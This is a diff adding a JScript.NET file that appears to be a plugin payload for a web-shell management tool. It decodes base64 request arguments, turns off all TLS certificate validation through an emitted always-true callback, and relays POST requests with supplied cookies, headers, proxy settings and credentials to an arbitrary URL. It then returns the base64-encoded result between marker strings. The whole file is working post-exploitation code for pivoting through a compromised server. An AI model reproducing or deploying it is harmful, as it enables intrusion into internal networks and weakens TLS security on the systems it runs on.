@@ -1,0 +1,114 @@
+function DEC(d){return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(d));}
+function ENC(d){return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(d));}
+try{
+    var pp=DEC(Request.Item['argument1']);
+    var ss=DEC(Request.Item['argument2']);
+    var url=DEC(Request.Item['argument3']);
+    var reqData=DEC(Request.Item['argument4']);
+    var reqDataSpliter=DEC(Request.Item['argument5']);
+    Response.Write(pp);
+
+    var argList = [];
+    argList[0] = Type.GetType('System.Object');
+    argList[1] = Type.GetType('System.Security.Cryptography.X509Certificates.X509Certificate');
+    argList[2] = new System.Security.Cryptography.X509Certificates.X509Chain().GetType();
+    argList[3] = System.Net.Security.SslPolicyErrors.None.GetType()
+    var dyMethod = new System.Reflection.Emit.DynamicMethod('_CertCallback_', Type.GetType('System.Boolean'), argList);
+    var gen = dyMethod.GetILGenerator();
+    gen.Emit(System.Reflection.Emit.OpCodes.Ldc_I4_1);
+    gen.Emit(System.Reflection.Emit.OpCodes.Ret);
+    var del =  dyMethod.CreateDelegate(System.Net.Security.RemoteCertificateValidationCallback);
+    System.Net.ServicePointManager.ServerCertificateValidationCallback = del;
+    var arr = reqData.split([reqDataSpliter], 11, System.StringSplitOptions.None);
+    var formStr = arr[0];
+    var cookies = arr[1];
+    var headers = arr[2];
+    var proxy = arr[3];
+    var pusr = arr[4];
+    var ppwd = arr[5];
+    var patten = arr[6];
+    var timeout = arr[7];
+    var domain = arr[8];
+    var username = arr[9];
+    var password = arr[10];
+    var req:System.Net.HttpWebRequest = System.Net.WebRequest.Create(url);
+    req.KeepAlive = true;
+    req.MaximumAutomaticRedirections = 1;
+    req.Method = 'POST';
+    var to = 0;
+    try{ to = int.Parse(timeout) * 1000; }catch(e){}
+    req.Timeout = to>0 ? to : 2*60*1000;
+    if(username != null && username.Length > 0 && password != null && password.Length > 0)
+    {
+        var credential = new System.Net.NetworkCredential(username, password);
+        if(domain != null && domain.Length > 0)
+        {
+            credential.Domain = domain;
+        }
+        req.Credentials = credential;
+    }
+    if (proxy != null && proxy.Length > 0)
+    {
+        var wProxy = new System.Net.WebProxy(proxy, false);
+        if (pusr != null && pusr.Length > 0)
+        {
+            wProxy.Credentials = new System.Net.NetworkCredential(pusr, ppwd);
+        }
+        req.Proxy = wProxy;
+    }
+    if (cookies != null && cookies.Length > 0)
+    {
+        req.Headers.Add(System.Net.HttpRequestHeader.Cookie, cookies);
+    }
+    
+    if (headers != null && headers.Length > 0)
+    {
+        var hdrs = headers.split('\n');
+        for (var i in hdrs)
+        {
+            var hdr:String    = hdrs[i];
+            var idx      = hdr.IndexOf(':');
+            if(idx>0){
+                var hdrKey   = hdr.Substring(0, idx);
+                var hdrValue = hdr.Substring(idx+1).Trim();
+                if (hdrKey.Equals('User-Agent', StringComparison.OrdinalIgnoreCase))
+                {
+                    req.UserAgent = hdrValue;
+                }
+                else if(hdrKey.Equals('Referer', StringComparison.OrdinalIgnoreCase))
+                {
+                    req.Referer = hdrValue;
+                }
+                else
+                {
+                    req.Headers.Add(hdrKey, hdrValue);
+                }
+            }
+        }
+    }
+    req.ContentType = 'application/x-www-form-urlencoded';
+    var data = Encoding.UTF8.GetBytes(formStr);
+    req.ContentLength = data.Length;
+    var reqStream = req.GetRequestStream();
+    reqStream.Write(data, 0, data.Length);
+    reqStream.Close();
+    var resp = req.GetResponse();
+    var res = '';
+    var respStream :System.IO.Stream = resp.GetResponseStream();
+    var sr = new System.IO.StreamReader(respStream);
+    var retStr = sr.ReadToEnd();
+    respStream.Close();
+    var m = retStr.match(patten);
+    if (m.length == 2)
+    {
+        res = m[1];
+    }
+    else
+    {
+        res = 'Error: Proxy: ' + retStr;
+    }
+    Response.Write(ENC(res));
+}catch(e){
+    Response.Write(ENC(e));
+}
+Response.Write(ss);
